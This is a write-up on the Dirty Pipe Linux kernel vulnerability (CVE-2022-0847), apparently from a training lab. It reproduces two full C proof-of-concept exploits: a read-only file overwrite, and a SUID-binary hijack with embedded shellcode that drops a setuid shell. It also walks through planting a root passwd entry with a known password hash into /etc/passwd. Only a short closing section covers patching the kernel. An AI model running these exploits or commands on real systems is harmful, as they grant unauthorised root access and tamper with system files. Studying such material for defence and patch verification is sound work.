Dirty Pipe: CVE-2022-0847


Exploit POC code here:

````
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
		return EXIT_FAILURE;
	}

	/* dumb command-line argument parser */
	const char *const path = argv[1];
	loff_t offset = strtoul(argv[2], NULL, 0);
	const char *const data = argv[3];
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	printf("It worked!\n");
	return EXIT_SUCCESS;
}
````

 Once compiled, this exploit gives us a lot of control over how we abuse the Dirty Pipe vulnerability. Specifically, it lets us specify the file we want to overwrite, the offset we would like to overwrite it at, and the content we would like to insert.
 
 Bearing in mind that the exploit won't let us create files (we can only overwrite information in existing files), we first need to find a file our user can read, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is /etc/passwd. Whilst password hashes are usually stored in the restricted-access /etc/shadow in modern Linux systems (as opposed to being stored traditionally in /etc/passwd), most Linux variants do still check to see if account password hashes are given in /etc/passwd. This means that we can write a user with root permissions and a known password hash directly into the passwd file!
 
 
 Let's generate a password hash and form a valid passwd entry before moving on. Pick a password then use the openssl command to create a SHA512Crypt hash of your chosen password:
 ![image](https://user-images.githubusercontent.com/64267672/158501420-3c7ed2c0-0728-492e-b604-125ba4ab7213.png)

Finally, insert your username and hash into this passwd entry template: USERNAME:HASH:0:0::/root:/bin/bash.

Your entry should look something like this:

````
muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash
`````

As we are overwriting existing entries in the password file, we also need to add a new line on at the end of our entry. This ensures that we avoid corrupting our entry with any remnants of the previous contents of the line.

Our final content should therefore look something like this (quotes included):
'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash
'

We have our file (/etc/passwd) and our content (the passwd entry) — all we need now is the offset. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.


The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite several accounts. Looking through the passwd file, the games account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use grep with the -b switch to find the offset of games from the start of the file:

grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin

189 becomes our offset to use

Now we are ready to explot fully;



gcc poc.c -o exploit

./exploit /etc/passwd <offset> 'USERNAME:HASH:0:0::/root:/bin/bash
> '

su {newuser}


![image](https://user-images.githubusercontent.com/64267672/158502627-ae47e87b-9a1d-4bc9-9876-d74c24e4a67a.png)

  
And root!!
  
Second POc;

  
````
//
// dirtypipez.c
//
// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
// a root shell. (and attempts to restore the damaged binary as well)
//
// Wow, Dirty CoW reloaded!
//
// -- blasty <peter@haxx.in> // 2022-03-07

/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
	/* open the input file and validate the specified offset */
	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return -1;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return -1;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return -1;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return -1;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, len);
	if (nbytes < 0) {
		perror("write failed");
		return -1;
	}
	if ((size_t)nbytes < len) {
		fprintf(stderr, "short write\n");
		return -1;
	}

	close(fd);

	return 0;
}

int main(int argc, char **argv) {
	if (argc != 2) {
		fprintf(stderr, "Usage: %s SUID\n", argv[0]);
		return EXIT_FAILURE;
	}

	char *path = argv[1];
	uint8_t *data = elfcode;

	int fd = open(path, O_RDONLY);
	uint8_t *orig_bytes = malloc(sizeof(elfcode));
	lseek(fd, 1, SEEK_SET);
	read(fd, orig_bytes, sizeof(elfcode));
	close(fd);

	printf("[+] hijacking suid binary..\n");
	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
		printf("[~] failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] dropping suid shell..\n");
	system(path);

	printf("[+] restoring suid binary..\n");
	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
		printf("[~] failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
	system("/tmp/sh");

	return EXIT_SUCCESS;
}
````

This exploit takes the arbitrary file write one stage further by abusing a rather special quality of the vulnerability. SUID Programs usually lose their SUID bit when you attempt to write to them; however, this does not happen with Dirty Pipe — in other words, we can write to any program that has permission to execute with higher privileges, without inadvertently destroying that extra permission (as would usually happen).
  
Instead of overwriting a file like /etc/passwd, it overwrites a user-specified SUID binary (such as /bin/su), injecting shellcode into it which then gets executed with the permissions of the privileged user (i.e. root). Specifically, the exploit hijacks the chosen SUID binary and forces it to create a backdoor binary in  /tmp which has the SUID bit and calls /bin/sh. It then restores the targeted SUID binary to full working order by re-adding the overwritten section, and uses the newly created backdoor to grant the attacker a shell as the privileged user.
  

![image](https://user-images.githubusercontent.com/64267672/158503495-73a20dcc-2087-47dc-af39-79146f5a87f2.png)

And we are root again!
  
####Remediations

Fortunately, the remediation for this vulnerability is very simple: update your kernel.

Patched versions of the Linux Kernel have been released for supported major kernel versions — specifically, the vulnerability has been patched in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102.

Ensure that you apply updates to all of your Linux devices (including any Android) as soon as security patches are released.
  
